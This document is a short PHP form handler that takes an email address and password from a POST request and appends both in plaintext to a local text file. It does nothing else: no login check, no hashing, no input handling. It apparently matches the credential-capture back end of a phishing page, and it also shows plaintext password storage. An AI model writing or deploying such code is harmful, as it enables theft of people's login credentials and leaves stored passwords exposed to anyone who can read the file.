<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $data = "Email: $email\nPassword: $password\n\n";

    $file = fopen("user_data.txt", "a"); // "a" opens the file for writing and creates it if it doesn't exist
    fwrite($file, $data);
    fclose($file);
}
?>
